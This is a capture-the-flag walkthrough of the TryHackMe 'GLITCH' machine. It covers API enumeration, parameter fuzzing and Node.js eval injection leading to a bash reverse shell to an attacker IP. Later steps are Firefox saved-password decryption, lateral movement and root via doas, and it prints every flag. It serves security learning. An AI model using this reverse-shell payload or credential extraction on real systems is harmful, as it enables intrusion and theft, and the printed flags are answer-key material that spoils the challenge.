# GLITCH

Challenge showcasing a web app and simple privilege escalation. Can you find the glitch?

# What is your access token?

Nmap only discovers 1 open port:

~~~
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: not allowed
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

Let's browse the web service. An interesting script at the end of the page gives the path of an API: 

~~~
kali@kali:/data/vpn$ curl -s http://10.10.16.166/
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>not allowed</title>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        height: 100vh;
        width: 100%;
        background: url('img/glitch.jpg') no-repeat center center / cover;
      }
    </style>
  </head>
  <body>
    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
  </body>
</html>
~~~

Browsing this URL provides us with a base64 encoded string that, once decoded, is the token:

~~~
kali@kali:/data/vpn$ curl -s http://10.10.16.166/api/access
{"token":"dGhpc19pc19ub3RfcmVhbA=="}
kali@kali:/data/vpn$ echo "dGhpc19pc19ub3RfcmVhbA==" | base64 -d
this_is_not_real 
~~~

Answer: `this_is_not_real`

# What is the content of user.txt?

*Hint: What other methods does the API accept?*

After several rabbit holes (`/robots.txt`, `/secret`), I eventually decided to further enumerate the `/api` directory:

~~~
kali@kali:/data/GLITCH$ gobuster dir -u http://10.10.16.166/api/ -x php,txt,bak,old,tar,zip -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.16.166/api/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     zip,php,txt,bak,old,tar
[+] Timeout:        10s
===============================================================
2021/04/29 15:12:46 Starting gobuster
===============================================================
/access (Status: 200)
/items (Status: 200)
===============================================================
2021/04/29 15:16:05 Finished
===============================================================
~~~

We discovered another path:

~~~
kali@kali:/data/vpn$ curl http://10.10.16.166/api/items
{"sins":["lust","gluttony","greed","sloth","wrath","envy","pride"],"errors":["error","error","error","error","error","error","error","error","error"],"deaths":["death"]}
~~~

Now, the hint was referring to "other methods". Let's try with `POST`:

~~~
kali@kali:/data/vpn$ curl -XPOST http://10.10.16.166/api/items
{"message":"there_is_a_glitch_in_the_matrix"}
~~~

Interesting. There must be a missing parameter. Let's fuzz it:

~~~
kali@kali:/data/vpn$ wfuzz -X POST -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt --hh=45 http://10.10.16.166/api/items?FUZZ=oops
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.16.166/api/items?FUZZ=oops
Total requests: 475254

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                             
=====================================================================

000002370:   500        10 L     64 W       1081 Ch     "cmd"

~~~

Indeed, our assumption was correct, and the URL takes a `cmd` parameter.

## Vulnerability

With this new statement, let's try to inject a command:

~~~
kali@kali:/data/GLITCH/files$ curl -X POST http://10.10.16.166/api/items?cmd=id
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: id is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
</body>
</html>
~~~

This error is generated by `nodejs`. below is the cleaned code:

~~~
ReferenceError: id is not defined
    at eval (eval at router.post (/var/web/routes/api.js:25:60), <anonymous>:1:1)
    at router.post (/var/web/routes/api.js:25:60)
    at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)
    at next (/var/web/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)
    at /var/web/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)
    at next (/var/web/node_modules/express/lib/router/index.js:275:10)
    at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)
~~~

## Proof of concept

Let's exploit (I found this resource useful: https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44):

~~~
kali@kali:/data/GLITCH/files$ curl -X POST "http://10.10.16.166/api/items?cmd=process.cwd()"
vulnerability_exploited /var/web
~~~

Our injection was successful and we are provided with the current path.

## Exploit and reverse shell

Use BurpSuite to send the following request:

~~~
POST /api/items?cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/10.8.50.72/4444+0>%261"') HTTP/1.1
Host: 10.10.16.166
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: token=value
Upgrade-Insecure-Requests: 1
If-None-Match: W/"a9-0aR6bAfiK/DB+A79vs3kEEVvJNc"

~~~

We now have a reverse shell:

~~~
kali@kali:/data/GLITCH$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.16.166] 49964
bash: cannot set terminal process group (1353): Inappropriate ioctl for device
bash: no job control in this shell
user@ubuntu:/var/web$ id
id
uid=1000(user) gid=1000(user) groups=1000(user),30(dip),46(plugdev)
~~~

## User flag

Let's get the user flag

~~~
user@ubuntu:/var/web$ cd /home
cd /home
user@ubuntu:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root root 4096 Jan 15 14:13 .
drwxr-xr-x 24 root root 4096 Jan 27 10:32 ..
drwxr-xr-x  8 user user 4096 Jan 27 10:33 user
drwxr-xr-x  2 v0id v0id 4096 Jan 21 09:05 v0id
user@ubuntu:/home$ cd user
cd user
user@ubuntu:~$ ls -la
ls -la
total 48
drwxr-xr-x   8 user user  4096 Jan 27 10:33 .
drwxr-xr-x   4 root root  4096 Jan 15 14:13 ..
lrwxrwxrwx   1 root root     9 Jan 21 09:05 .bash_history -> /dev/null
-rw-r--r--   1 user user  3771 Apr  4  2018 .bashrc
drwx------   2 user user  4096 Jan  4 13:41 .cache
drwxrwxrwx   4 user user  4096 Jan 27 10:32 .firefox
drwx------   3 user user  4096 Jan  4 13:41 .gnupg
drwxr-xr-x 270 user user 12288 Jan  4 14:07 .npm
drwxrwxr-x   5 user user  4096 Apr 29 16:44 .pm2
drwx------   2 user user  4096 Jan 21 08:47 .ssh
-rw-rw-r--   1 user user    22 Jan  4 15:29 user.txt
user@ubuntu:~$ cat user.txt
cat user.txt
THM{i_don't_know_why}
~~~

User flag: `THM{i_don't_know_why}`

# What is the content of root.txt?

*Hint: My friend says that sudo is bloat.*

## Lateral move

The enumeration of the `/home` directory shows another user: `v0id`. As we don't have the password associated to the `user` account we are currently using, it seems reasonable to move laterally to the other user.

Notice a `.firefox` directory in the home directory of our user:

~~~
user@ubuntu:~$ ll
ll
total 52
drwxr-xr-x   9 user user  4096 Apr 29 18:14 ./
drwxr-xr-x   4 root root  4096 Jan 15 14:13 ../
lrwxrwxrwx   1 root root     9 Jan 21 09:05 .bash_history -> /dev/null
-rw-r--r--   1 user user  3771 Apr  4  2018 .bashrc
drwx------   2 user user  4096 Jan  4 13:41 .cache/
drwxr-x---   3 user user  4096 Apr 29 17:58 .config/
drwxrwxrwx   4 user user  4096 Jan 27 10:32 .firefox/ <---------- interesting!
drwx------   4 user user  4096 Apr 29 17:58 .gnupg/
drwxr-xr-x 270 user user 12288 Jan  4 14:07 .npm/
drwxrwxr-x   5 user user  4096 Apr 29 16:44 .pm2/
drwx------   2 user user  4096 Apr 29 17:41 .ssh/
-rw-rw-r--   1 user user    22 Jan  4 15:29 user.txt
~~~

Compress the folder and download the archive locally. Download [firefox_decrypt](https://github.com/unode/firefox_decrypt) and reveal `v0id`'s password:

~~~
kali@kali:/data/src/firefox_decrypt$ python3 firefox_decrypt.py /data/GLITCH/files/.firefox/
Select the Mozilla profile you wish to decrypt
1 -> hknqkrn7.default
2 -> b5w4643p.default-release
2

Website:   https://glitch.thm
Username: 'v0id'
Password: 'love_the_void'
~~~

We can now switch to `v0id`:

~~~
user@ubuntu:/var/web$ su v0id
su v0id
Password: love_the_void

v0id@ubuntu:/var/web$ id
id
uid=1001(v0id) gid=1001(v0id) groups=1001(v0id)
~~~

## Privilege escalation

Unfortunately, the `v0id` user is not allowed to run any program with `sudo`.

~~~
v0id@ubuntu:/var/web$ sudo -l
sudo -l
[sudo] password for v0id: love_the_void

Sorry, user v0id may not run sudo on ubuntu.
~~~

Searching for files owned by root with the SUID bit set reveals another interesting program though (`doas` is working like `sudo`):

~~~
v0id@ubuntu:~$ find / -type f -user root -perm -u=s 2>/dev/null
find / -type f -user root -perm -u=s 2>/dev/null
/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/doas <---------------------- interesting!
~~~

Let's check:

~~~
v0id@ubuntu:~$ doas -u root /bin/bash
doas -u root /bin/bash
Password: love_the_void

root@ubuntu:/home/v0id# cd /root
cd /root
root@ubuntu:~# cat root.txt
cat root.txt
THM{diamonds_break_our_aching_minds}
~~~

Root flag: `THM{diamonds_break_our_aching_minds}`
